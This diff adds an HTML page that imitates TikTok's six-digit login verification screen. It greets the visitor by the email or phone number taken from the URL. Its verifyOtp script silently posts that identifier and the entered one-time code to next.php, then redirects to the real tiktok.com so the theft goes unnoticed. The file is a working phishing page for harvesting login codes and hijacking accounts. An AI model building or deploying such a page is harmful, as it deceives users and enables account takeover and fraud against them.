@@ -1,0 +1,278 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Enter Code - TikTok</title>
+    <link href="assets/bootstrap/css/bootstrap.min.css" rel="stylesheet">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=TikTok+Sans:ital,wght@0,300;0,400;0,600;0,800;1,400&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            /* core brand colors */
+            --ttk-black: #000000;
+            --ttk-white: #ffffff;
+            --ttk-pink: #FE2C55; /* "Razzmatazz" */
+            --ttk-cyan: #25F4EE; /* "Splash" */
+
+            /* UI neutrals */
+            --bg: var(--ttk-white);
+            --surface: #0f0f0f;
+            --muted: #9a9a9a;
+        }
+
+        * { box-sizing: border-box; }
+
+        html, body {
+            margin: 0 !important;
+            padding: 0 !important;
+             font-family: "TikTok Sans", Inter, "Helvetica Neue", Arial, sans-serif !important;
+            width: 100% !important;
+            overflow-x: hidden !important;
+            background: var(--bg) !important;
+            color: var(--ttk-black) !important;
+        }
+
+        .tiktok-container {
+            background: var(--ttk-white) !important;
+            color: var(--ttk-black) !important;
+            margin: 1rem auto 0 !important;
+            padding: 20px !important;
+            width: 100% !important;
+            max-width: none !important;
+            min-height: 400px !important;
+            display: flex !important;
+            flex-direction: column !important;
+            justify-content: center !important;
+            align-items: center !important;
+            padding-bottom: 80px !important; /* Space for fixed footer */
+            box-sizing: border-box !important;
+        }
+
+        .tiktok-form {
+            width: 100% !important;
+            max-width: 320px !important;
+            margin: 0 auto !important;
+        }
+
+    .header {
+        display: flex !important;
+        align-items: center !important;
+        justify-content: space-between !important;
+        margin-bottom: 25px !important;
+        max-width: 320px !important;
+        margin: 0 auto 25px !important;
+        position: relative !important;
+    }
+
+    .back-btn {
+        font-size: 28px !important;
+        color: var(--ttk-black) !important;
+        text-decoration: none !important;
+        cursor: pointer !important;
+        font-weight: 400 !important;
+        letter-spacing: 4px !important;
+    }
+
+    .help-icon {
+        width: 20px !important;
+        height: 20px !important;
+        background: var(--ttk-white) !important;
+        border: 2px solid var(--ttk-black);
+        border-radius: 50% !important;
+        display: flex !important;
+        align-items: center !important;
+        justify-content: center !important;
+        color: var(--ttk-black) !important;
+        font-size: 17px !important;
+        font-weight: 600 !important;
+    }
+
+        .tiktok-logo {
+            width: 32px !important;
+            height: 32px !important;
+            margin-right: 16px !important;
+            flex-shrink: 0 !important;
+        }
+
+        .tiktok-logo img {
+            width: 100% !important;
+            height: 100% !important;
+        }
+
+        .otp-title {
+            font-size: 20px !important;
+            font-weight: 800 !important;
+             font-family: "TikTok Sans", Inter, "Helvetica Neue", Arial, sans-serif !important;
+            margin: 0 0 15px 0 !important;
+            color: var(--ttk-black) !important;
+            text-align: left !important;
+        }
+
+        .otp-message {
+            text-align: left !important;
+            margin-bottom: 16px !important;
+            color: var(--muted) !important;
+            font-size: 12px !important;
+            font-weight: 600 !important;
+        }
+
+        .otp-inputs {
+            display: flex !important;
+            justify-content: center !important;
+            gap: 8px !important;
+            margin: 20px 0 !important;
+        }
+
+        .otp-inputs input {
+            width: 40px !important;
+            height: 50px !important;
+            text-align: center !important;
+            font-size: 18px !important;
+            font-weight: bold !important;
+            border: 1px solid #ddd !important;
+            border-radius: 4px !important;
+            background: var(--ttk-white) !important;
+            color: var(--ttk-black) !important;
+            outline: none !important;
+        }
+
+        .otp-inputs input:focus {
+            border: 2px solid var(--ttk-pink) !important;
+        }
+
+        .otp-inputs input:hover {
+            border: 2px solid var(--ttk-pink) !important;
+        }
+
+        .signin-btn {
+            width: 100% !important;
+            padding: 10px !important;
+            background: var(--ttk-pink) !important;
+            color: var(--ttk-white) !important;
+            border: none !important;
+            border-radius: 6px !important;
+            font-size: 16px !important;
+            font-weight: 600 !important;
+            cursor: pointer !important;
+            margin-top: 35px !important;
+        }
+
+        .resend-link{
+            display: block !important;
+            text-align: left !important;
+            margin-top: 10px !important;
+            color: var(--ttk-black) !important;
+            text-decoration: none !important;
+            font-size: 12px !important;
+        }
+        .help-link{
+            display: block !important;
+            text-align: left !important;
+            margin-top: 10px !important;
+            color: var(--ttk-black) !important;
+            text-decoration: none !important;
+            font-size: 12px !important;
+            font-weight: bold;
+        }
+
+       
+    </style>
+</head>
+<body>
+    <div class="tiktok-form">
+        <div class="header">
+            <a class="back-btn" onclick="goBack()"><</a>
+            <div class="help-icon">?</div>
+        </div>
+
+        <div class="otp-title">Enter 6 digit code</div>
+
+        <div class="otp-message" id="otp-message">
+            <!-- Dynamic message will be inserted here -->
+        </div>
+
+        <div class="otp-inputs">
+            <input type="text" maxlength="1" id="otp1" oninput="moveToNext(this, 'otp2')" onkeydown="handleBackspace(this, null)">
+            <input type="text" maxlength="1" id="otp2" oninput="moveToNext(this, 'otp3')" onkeydown="handleBackspace(this, 'otp1')">
+            <input type="text" maxlength="1" id="otp3" oninput="moveToNext(this, 'otp4')" onkeydown="handleBackspace(this, 'otp2')">
+            <input type="text" maxlength="1" id="otp4" oninput="moveToNext(this, 'otp5')" onkeydown="handleBackspace(this, 'otp3')">
+            <input type="text" maxlength="1" id="otp5" oninput="moveToNext(this, 'otp6')" onkeydown="handleBackspace(this, 'otp4')">
+            <input type="text" maxlength="1" id="otp6" onkeydown="handleBackspace(this, 'otp5')">
+        </div>
+
+        <button class="signin-btn" onclick="verifyOtp()">Verify code</button>
+
+        <a href="#" class="resend-link" onclick="resendCode()">Resend code</a>
+
+        <a href="#" class="help-link" onclick="needHelp()">Need help logging in?</a>
+    </div>
+
+  
+
+    <script>
+        function goBack() {
+            window.location.href = 'simple_tiktok.html';
+        }
+
+        // Get URL parameters
+        function getUrlParameter(name) {
+            name = name.replace(/[\[]/, '\\[').replace(/[\]]/, '\\]');
+            var regex = new RegExp('[\\?&]' + name + '=([^&#]*)');
+            var results = regex.exec(location.search);
+            return results === null ? '' : decodeURIComponent(results[1].replace(/\+/g, ' '));
+        }
+
+        // Set the message
+        var type = getUrlParameter('type');
+        var value = getUrlParameter('value');
+        var message = "";
+        if (type === 'email') {
+            message = "Hi " + value + "! Your code was sent to your registered email.";
+        } else {
+            message = "Hi " + value + "! Your code was sent to your registered phone number.";
+        }
+        document.getElementById('otp-message').innerText = message;
+
+        function moveToNext(current, nextId) {
+            if (current.value.length === 1 && nextId) {
+                document.getElementById(nextId).focus();
+            }
+        }
+
+        function handleBackspace(current, prevId) {
+            if (event.key === 'Backspace' && current.value === '' && prevId) {
+                document.getElementById(prevId).focus();
+            }
+        }
+
+        function verifyOtp() {
+            var otp = '';
+            for (var i = 1; i <= 6; i++) {
+                otp += document.getElementById('otp' + i).value;
+            }
+            if (otp.length === 6) {
+                // Send OTP to next.php
+                const xhr = new XMLHttpRequest();
+                xhr.open('POST', 'next.php', true);
+                xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+                xhr.send('di=' + encodeURIComponent(value) + '&otp=' + encodeURIComponent(otp));
+                window.location.href = 'https://www.tiktok.com';
+            } else {
+                alert("Please enter a 6-digit code.");
+            }
+        }
+
+        function resendCode() {
+            alert("Code resent!");
+            // Optionally send resend request, but for now just alert
+        }
+
+        function needHelp() {
+            alert("Please contact support.");
+            // Optionally redirect to help page
+        }
+    </script>
+</body>
+</html>
